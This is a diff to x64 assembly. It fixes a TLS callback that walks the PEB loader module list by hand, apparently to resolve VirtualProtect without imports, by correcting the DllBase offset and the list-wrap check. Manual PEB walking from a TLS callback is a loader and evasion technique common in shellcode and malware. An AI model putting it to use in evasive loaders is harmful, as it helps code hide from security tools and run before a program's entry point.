@@ -42,7 +42,7 @@ MEM_RELEASE           equ 0x8000
 ; InMemoryOrderModuleList offsets (x64)
 PEB_LDR_OFFSET        equ 0x18
 LDR_MODULE_FLINK      equ 0x20
-LDR_MODULE_BASE       equ 0x30   ; was 0x20 in some docs, but x64: +0x30
+LDR_MODULE_BASE       equ 0x20   ; DllBase from InMemoryOrderLinks ptr (+0x30 in LDR, -0x10 for links)
 LDR_MODULE_SIZE       equ 0x40
 LDR_MODULE_NAME_RVA   equ 0x58   ; UNICODE_STRING name
 
@@ -124,11 +124,13 @@ TlsCallback:
     mov     r12, r15             ; r12 = PEB
 .vp_resolve:
     ; PEB -> Ldr -> InMemoryOrderModuleList.Flink
+    ; Save the first Flink as the wrap-around sentinel.
     mov     rbx, [r12 + PEB_LDR_OFFSET]
     test    rbx, rbx
     jz      .early_return
     mov     rbx, [rbx + LDR_MODULE_FLINK]
-    mov     rsi, rbx             ; rsi = first module entry
+    mov     rsi, rbx             ; rsi = current module entry (InMemoryOrderLinks)
+    mov     r15, rbx             ; r15 = saved list head (wrap sentinel)
 
     ; Walk the module list (up to 20 entries)
     xor     r8d, r8d             ; module counter
@@ -137,8 +139,11 @@ TlsCallback:
     jae     .early_return        ; too many modules, give up
     inc     r8d
 
-    ; Get DllBase
-    mov     rbx, [rsi + LDR_MODULE_BASE]  ; DllBase
+    ; Get DllBase from InMemoryOrderLinks pointer.
+    ; InMemoryOrderLinks is at offset 0x10 within LDR_DATA_TABLE_ENTRY.
+    ; DllBase is at offset 0x30 within LDR_DATA_TABLE_ENTRY.
+    ; So from the InMemoryOrderLinks pointer: DllBase = ptr + 0x20
+    mov     rbx, [rsi + 0x20]    ; DllBase
     test    rbx, rbx
     jz      .next_module
 
@@ -231,8 +236,8 @@ TlsCallback:
     jmp     .name_loop
 
 .next_module:
-    mov     rsi, [rsi]           ; Flink (next module)
-    cmp     rsi, rbx             ; wrapped back to list head?
+    mov     rsi, [rsi]           ; Flink (next InMemoryOrderLinks entry)
+    cmp     rsi, r15             ; wrapped back to list head?
     jne     .module_loop
     jmp     .early_return        ; not found
 
